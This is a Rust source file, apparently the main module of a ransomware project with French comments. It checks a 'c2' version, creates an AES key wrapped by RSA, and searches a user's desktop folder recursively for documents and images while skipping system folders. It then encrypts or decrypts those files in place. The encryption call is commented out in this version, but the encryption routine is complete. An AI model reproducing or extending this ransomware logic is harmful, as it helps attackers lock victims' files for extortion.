use std::path::{Path, PathBuf};

mod aes;
mod constants;
mod file;
mod simple_rsa;
mod utils;
mod version;

use aes::SecureAes;
use rsa;

#[tokio::main]
async fn main() {
    let good_version = version::check_version().await;
    if !good_version {
        println!("Le c2 n'est pas à jour !");
        std::process::exit(1);
    } else {
        // Générer et stocker les clés
        match setup_keys().await {
            Ok(_) => println!("Clés générées et stockées avec succès"),
            Err(err) => {
                println!("Erreur lors de la génération des clés: {:?}", err);
                std::process::exit(1);
            }
        }

        let aes_key: [u8; 32] = match load_aes_key().await {
            Ok(data) => data,
            Err(err) => {
                println!("Erreur lors de la récupération des clés: {:?}", err);
                std::process::exit(1);
            }
        };

        let cypher = aes::SecureAes::new(&aes_key);

        let excluded_dirs = vec![
            "C:\\temp\\marginal",
            "C:\\Windows\\System32",
            "C:\\Program Files",
        ];

        let files = match file::find_files_by_extensions_recursive_with_exclusions(
            "C:\\Users\\thbia\\Desktop\\appart2",
            &[
                ".txt", ".pdf", ".docx", ".xlsx", ".ods", ".png", ".jpg", ".jpeg",
            ],
            &excluded_dirs,
        ) {
            Ok(data) => data,
            Err(err) => {
                println!("Can't get files recursively {:?}", err);
                std::process::exit(1);
            }
        };

        println!("{:?}", files);

        // encrypt_files(&files, &cypher).await;
        decrypt_files(&files, &cypher).await;
    };

    std::process::exit(0);
}

async fn setup_keys() -> Result<(), Box<dyn std::error::Error>> {
    let key_dir = Path::new("C:\\temp\\marginal");
    let key_file = key_dir.join("key");
    let private_key_file = key_dir.join("private_key");

    // Vérifier si les clés existent déjà
    if key_file.exists() && private_key_file.exists() {
        println!("Les clés existent déjà, pas besoin de les régénérer");
        return Ok(());
    }

    // Générer une clé AES
    let aes_key = aes::SecureAes::generate_key();

    // Générer une paire de clés RSA
    let rsa_private_key = simple_rsa::generate_private_key(2048);

    // Chiffrer la clé AES avec RSA
    let encrypted_aes_key = simple_rsa::encrypt(&rsa_private_key, &aes_key);

    // Sérialiser la clé privée RSA au format PKCS#1 PEM
    use rsa::pkcs1::EncodeRsaPrivateKey;
    let private_key_pem = rsa_private_key.to_pkcs1_pem(rsa::pkcs1::LineEnding::LF)?;

    // Sauvegarder les clés
    file::force_write_in(&key_file, &encrypted_aes_key)?;
    file::force_write_in(&private_key_file, private_key_pem.as_bytes())?;

    println!("Clés générées et sauvegardées dans C:\\temp\\marginal\\");

    Ok(())
}

async fn load_aes_key() -> Result<[u8; 32], Box<dyn std::error::Error>> {
    let key_dir = Path::new("C:\\temp\\marginal");
    let key_file = key_dir.join("key");
    let private_key_file = key_dir.join("private_key");

    // Lire la clé AES chiffrée
    let encrypted_aes_key = file::read_file(&key_file)?;

    // Lire la clé privée RSA
    let private_key_pem = file::read_file(&private_key_file)?;
    let private_key_str = String::from_utf8(private_key_pem)?;

    // Désérialiser la clé privée RSA au format PKCS#1
    use rsa::pkcs1::DecodeRsaPrivateKey;
    let rsa_private_key = rsa::RsaPrivateKey::from_pkcs1_pem(&private_key_str)?;

    // Déchiffrer la clé AES
    let aes_key_bytes = simple_rsa::decrypt(&rsa_private_key, encrypted_aes_key);

    // Convertir en array de 32 bytes
    if aes_key_bytes.len() != 32 {
        return Err("La clé AES déchiffrée n'a pas la bonne taille".into());
    }

    let mut aes_key = [0u8; 32];
    aes_key.copy_from_slice(&aes_key_bytes);

    Ok(aes_key)
}

async fn encrypt_files(files: &Vec<PathBuf>, cypher: &SecureAes) {
    for file in files.iter() {
        match file {
            _ => {
                let file_content = match file::read_file(Path::new(file)) {
                    Ok(data) => data,
                    Err(err) => {
                        println!("Error on file {:?}, {:?}", file, err);
                        continue;
                    }
                };
                let encrypt_content = match cypher.encrypt(&file_content) {
                    Ok(data) => data,
                    Err(err) => {
                        println!("Error on file {:?}, {:?}", file, err);
                        continue;
                    }
                };
                match file::write_in(file, &encrypt_content) {
                    Ok(()) => {
                        println!("File {:?} encrypted successfully", file)
                    }
                    Err(err) => println!("Error on file: {:?}", err),
                };
            }
        }
    }
}

async fn decrypt_files(files: &Vec<PathBuf>, cypher: &SecureAes) {
    for file in files.iter() {
        match file {
            _ => {
                let file_content = match file::read_file(Path::new(file)) {
                    Ok(data) => data,
                    Err(err) => {
                        println!("Error on file {:?}, {:?}", file, err);
                        continue;
                    }
                };
                let decrypted_content = match cypher.decrypt(&file_content) {
                    Ok(data) => data,
                    Err(err) => {
                        println!("Error on file {:?}, {:?}", file, err);
                        continue;
                    }
                };
                match file::write_in(file, &decrypted_content) {
                    Ok(()) => {
                        println!("File {:?} decrypted successfully", file)
                    }
                    Err(err) => println!("Error on file: {:?}", err),
                };
            }
        }
    }
}
